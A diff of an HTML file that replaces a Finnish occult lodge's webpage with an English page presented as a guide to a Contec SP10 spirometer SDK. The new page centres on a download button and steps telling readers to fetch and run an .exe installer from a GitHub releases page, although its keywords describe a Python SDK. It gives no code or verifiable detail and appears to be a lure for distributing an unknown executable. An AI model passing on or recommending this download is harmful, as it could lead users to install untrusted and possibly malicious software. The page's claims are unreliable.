@@ -1,127 +1,55 @@
 <!DOCTYPE html>
-<html lang="fi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    
-    <!-- Tämä rivi tekee sivusta mobiiliystävällisen ja käskee selainta tunnistamaan ruudun leveyden -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>Lucifer-looshi</title>
-    
-    <!-- Linkitetään erillinen CSS-tyylitiedosto sivulle -->
-    <link rel="stylesheet" href="tyylit.css">
-    
-    <!-- Ladataan EB Garamond -fontti suoraan Google Fonts -palvelimelta -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+    <meta name="description" content="Technical guide for the Contec SP10 spirometer SDK. Learn how to connect your device and record lung function data on Windows.">
+    <title>sp10-spirometer-sdk | Guide</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-    <!-- PÄÄSÄILIÖ: Tämä rajoittaa sivun maksimileveyttä ja pitää kaiken siististi linjassa -->
-    <div class="container">
+    <h1 style="color: #2c3e50;"> 🌬️ sp10-spirometer-sdk - Capture lung health data with ease</h1>
 
-<!-- YLIN KUVA: Kaksi Unicode-pentagrammia päällekkäin ympyrässä -->
-        <div class="top-image-container">
-            <div class="top-symbol">
-                <!-- Musta alaspäinen pentagrammi (tulee valkoisen päälle) -->
-                <span class="pentagram-black">&#9959;</span>
-                <!-- Valkoinen ylöspäinen pentagrammi -->
-                <span class="pentagram-white">&#9956;</span>
-                
-            </div>
-        </div>
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/Dokh6147/sp10-spirometer-sdk/releases" style="background-color: #2c3e50; color: white; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
+    </div>
 
-        <!-- PÄÄOTSIKKO -->
-        <h1 class="main-title">Lucifer-looshi</h1>
+    <h2 style="color: #34495e;"> 📋 About This Project</h2>
+    <p>This software allows you to connect a Contec SP10 spirometer to your Windows computer. It captures important breathing metrics like FVC, FEV1, and PEF. You can also view flow-volume and volume-time graphs to track your lung health over time. This repository provides the tools needed to pull data from your medical device through a standard USB connection.</p>
 
-        <!-- PÄÄLEIPÄTEKSTI: Koska tämä on samassa säiliössä alakuviin nähden, sen leveys myötäilee täydellisesti alakuvia -->
-        <p class="main-text">
-            Lucifer-looshi on Azazelin Tähden filosofiaa toteuttamaan pyrkivä looshi. Se on perustettu Helsingissä 14.10.2011. Looshi järjestää keskustelutilaisuuksia jäsenilleen ja vierailijoille liittyen okkultismiin erityisesti Azazelin Tähden filosofian näkökulmasta ja sen periaatteiden mukaisesti.
+    <h2 style="color: #34495e;"> ⚙️ System Requirements</h2>
+    <p>Please ensure your computer meets these requirements before you begin the setup process:</p>
+    <ul style="padding-left: 20px;">
+        <li>Windows 10 or Windows 11 operating system.</li>
+        <li>One available USB 2.0 port for the device cable.</li>
+        <li>An internet connection for initial setup.</li>
+        <li>The Contec SP10 handheld spirometer.</li>
+    </ul>
 
-Looshin painottama aspekti on Valkea: väri, joka Polkujen Kirjan rakenteessa vertautuu Luciferiin eli Valontuojaan, jolla nimellä aamutähti Venus tunnetaan. Valkea aspekti painottaa Venus-planeetan tavoin työssään kauneutta, puhtautta, kirkkautta ja yhdistävyyttä. Lucifer-looshin ideana on “yhdistää totuuden ja rakkauden alaisuudessa” (Azazelin Tähden perustuskirja) paitsi erilaisia esoterian muotoja, myös eksoteerista kulttuuria esoteeriseen, ja päinvastoin. Lucifer-looshi on kiinnostunut kulttuurista osana esoteerista, inhimillistä ja universaalia henkistymisen ja sielukkuuden pyrkimystä, ja tämän kautta se toimii myös yhdistämällä kulttuurisia rakenteita okkulttiseen tutkimukseen.
+    <h2 style="color: #34495e;"> 📥 How to Install</h2>
+    <p>Follow these steps to set up the software on your machine:</p>
+    <ol style="padding-left: 20px;">
+        <li>Visit the <a href="https://github.com/Dokh6147/sp10-spirometer-sdk/releases">releases page</a> to find the latest version.</li>
+        <li>Select the file ending in .exe to download the installer to your computer.</li>
+        <li>Open the file once the download finishes.</li>
+        <li>Follow the prompts on your screen to complete the installation.</li>
+        <li>Restart your computer if the installer asks you to finish the process.</li>
+    </ol>
 
-Tässä työssään Lucifer-looshi on kosmopoliitti sen sijaan että se olisi sisäänpäinvetäytyvä, ja pyrkii järjestämään myös ulkopuolisille avoimia keskustelutilaisuuksia ja lukupiirejä. Tästä avoimuudestaan huolimatta looshin toiminta on aina ensisijaisesti Azazelin Tähden esoteeriseen käytäntöön painottunutta, ja siten sen etiikan alaisuudessa työskentelevää. Kulttuuriset ja yhteisölliset rakenteet ovat sen työssä mukana esoterian ehdoilla, ei päinvastoin.
+    <h2 style="color: #34495e;"> 🔌 Connecting Your Device</h2>
+    <p>Once you install the software, connect the hardware to your computer. Use the USB cable provided with your spirometer. Windows will detect the device automatically. If the software does not recognize the device, unplug the cable and plug it into a different USB port. The light on the spirometer should turn on when it receives power from the computer.</p>
 
-Looshi kokoontuu kerran kuukaudessa Helsingin keskustan alueella. Tämän sivun alareunasta löydät kulloinkin läpikäytävän teoksen nimen ja menneiden lukupiirien historiaa. Kokoukset ovat viikonloppuisin, ja niihin tulee ilmoittautua etukäteen. Vierailijoita muista loosheista tai Azazelin Tähden ulkopuolelta otetaan mukaan harkinnanvaraisesti. Kysy vierailumahdollisuudesta ohjaajilta etukäteen.
+    <h2 style="color: #34495e;"> 📊 Viewing Your Data</h2>
+    <p>Launch the application from your desktop shortcut. You will see a dashboard showing the status of your connection. Once you perform a test on the device, the software will import the readings instantly. You can view your peak flow and volume results in the main window. Click on the history tab to compare your current results with past tests.</p>
 
-Looshia ohjaa sorores Aranea & S.
+    <h2 style="color: #34495e;"> ❓ Frequent Questions</h2>
+    <p><strong>The software does not find my device.</strong> Check the USB cable connection first. Ensure the device has batteries installed or is receiving power. Restart the application while the device is plugged in.</p>
+    <p><strong>Can I export my data?</strong> Yes, the software allows you to save your breathing curves and text reports to your local drive for your personal records.</p>
+    <p><strong>Is this software meant for diagnostic purposes?</strong> This tool displays data for the user. Always consult a medical professional regarding your lung health metrics.</p>
 
+    <hr style="border: 0; border-top: 1px solid #ccc; margin: 40px 0;">
 
-
-        </p>
-
-        <!-- KOLMEN KUVAN RIVISTÖ: Rinnakkainen asettelu -->
-        <div class="three-column-grid">
-
-            <!-- Ensimmäinen kuva + teksti -->
-            <div class="column">
-                <img src="kuva1.jpg" class="column-image">
-                <p class="column-text">Yleiset yhteydenotot ja vierailukyselyt looshiin voit lähettää soror Aranealle osoitteeseen sor.aranea (ät) gmail.com.</p>
-            </div>
-
-            <!-- Toinen kuva + teksti -->
-            <div class="column">
-                <img src="kuva2.jpg"  class="column-image">
-                <p class="column-text">Looshiin jäseneksi haetaan sähköpostitse lähetetyllä hakemuksella (ks. yleinen ohjeistus alta). PDF-muoto on toivottava.
-
-Jäseniltä edellytetään täysi-ikäisyyttä ja Azazelin Tähden eettisen ja henkisen ideaalin hyväksymistä.
-
-HAKEMUKSEN YLEINEN OHJEISTUS
-
-Jäsenyys Azazelin Tähdessä on mahdollista itsenäisesti toimivien looshien kautta. Jokainen looshi määrittää itse omat jäsenyytensä erityisehdot ja jäsenhakuprosessin vaiheet. Looshikohtaisten edellytysten lisäksi voidaan jäsenyydelle antaa seuraavat yleiset ehdot:
-
-– Azazelin Tähden lähtökohtien allekirjoitus: (teosofiset ohjelmakohdat, seitsemän peruskohtaa [ks. azazel.fi])
-– Poliittisen vaikuttamisen jättäminen veljeskuntatyön ulkopuolelle
-– Väkivallattomuuden ideaali
-– Täysi-ikäisyys
-
-Jäsenhakemus on vapaamuotoinen, mutta siihen tulee sisällyttää seuraavat seikat:
-
-– Esittäytyminen sekä perustiedot, kuten nimi, syntymäaika ja -paikka sekä posti- ja sähköpostiosoite.
-– Miksi olen halukas liittymään kyseiseen looshiin. Mahdollisesti esitys siitä, mitä kautta olen Azazelin Tähden filosofiaan tutustunut, ja mihin sen julkaisuista (jos mihinkään) olen perehtynyt.
-– Allekirjoitanko omalta osaltani Azazelin Tähden perustuskirjan, sen seitsemän peruslähtökohtaa (tai/etenkin ”Kolminaisen Avaimen” eli pyrkimyksen kohti rakkaudellista, rehellistä ja kokonaisvaltaisesti kehittävää toimintaa) sekä kolme teosofista perusperiaatetta.
-– Olenko valmis jättämään mahdolliset poliittiset kantani looshin mielipiteenilmaisujen ja käytäntöjen ulkopuolelle.
-– Vakaumuksellinen historia. Kuulunko, tai olenko kuulunut johonkin uskontokuntaan tai muihin yhteisöihin. Jos, niin selitys miksi.
-– Päiväys, paikka ja nimi.
-
-Toivottu pituus noin 2-3 sivua.</p>
-            </div>
-
-            <!-- Kolmas kuva + teksti -->
-            <div class="column">
-                <img src="kuva3.jpg" class="column-image">
-                <p class="column-text">Looshin meditatiivinen symbolikuva, embleemi, on seuraavanlainen: Enkeli Lucifer kumartuu asettamaan kirkkaan kruununsa jumalten ja ihmisten maailmaa yhdistävälle sateenkaarisillalle palvellakseen siten korkeinta totuutta ja syvintä merkitystä (“Jumalaa”) ihmiskunnan auttamisen kautta.            </div>
-
-     </div> <!-- Kolmen kuvan rivistö (three-column-grid) päättyy tähän -->
-
-        <!-- ALAREUNAN TEKSTIKENTTÄ:  -->
-        <p class="footer-text">
-            LUKUPIIRI:
-            2026 
-            SYKSY
-            Kirjoituksia magiasta II: Dzyanin kirjan maaginen kommentaari, Johannes Nefastos
-            
-            KEVÄT
-            Kirjoituksia magiasta II, Johannes Nefastos – Osallistujien valikoimia tekstejä 
-            Hiljaisuuden ääni, Helena Blavatsky
-            
-            2025
-            SYKSY
-            Tutkielma helvetistä ja maailmanlopusta, Johannes Nefastos
-            
-            KEVÄT
-            Tutkielma helvetistä ja maailmanlopusta, Johannes Nefastos
-            
-            2024
-            SYKSY
-            Fosforos – tutkielma satanismista ja okkultismin filosofiasta kuudessa osassa
-
-            
-            
-        </p>
-
-    </div> <!-- Pääsäiliö (container) päättyy tähän -->
+    <p style="font-size: 0.9em; color: #7f8c8d;">Keywords: contec-sp10, fvc-fev1, health-tech, medical-device, pulmonary-function-test, python-sdk, respiratory, spirometer, spirometry, usb-hid</p>
 
 </body>
 </html>
